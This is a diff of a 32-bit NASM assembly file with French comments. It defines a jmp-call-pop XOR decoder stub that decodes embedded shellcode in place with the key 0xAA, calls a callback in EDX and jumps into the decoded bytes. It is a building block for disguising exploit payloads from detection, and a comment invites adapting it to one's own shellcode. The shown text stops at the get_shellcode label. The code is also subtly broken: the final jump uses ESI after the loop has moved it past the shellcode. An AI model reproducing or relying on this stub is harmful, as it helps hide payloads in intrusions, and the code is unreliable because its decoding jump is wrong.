@@ -1,20 +1,29 @@
+BITS 32
+
+section .text
+global _start
+
+%define shellcode_length 32     ; adapte cette valeur à ton shellcode
+%define key 0xAA                ; ta clé XOR
+
 _start:
     jmp short get_shellcode
 
 decode_loop:
-    pop esi                ; esi pointe sur le shellcode encodé
+    pop esi                     ; ESI pointe sur le shellcode encodé
     xor ecx, ecx
     mov cl, shellcode_length
-    mov bl, key            ; clé XOR
+    mov bl, key
+
 decode_next:
-    xor byte ptr [esi], bl ; décode le byte
+    xor byte [esi], bl          ; décode le byte
     inc esi
     loop decode_next
 
-    ; Appeler le callback (adresse dans edx par exemple)
-    call edx               ; appelle la fonction callback
+    ; Appelle le callback (adresse dans EDX par exemple)
+    call edx
 
-    ; Après callback, saute au shellcode décodé
+    ; Saut au shellcode décodé
     jmp esi
 
 get_shellcode:
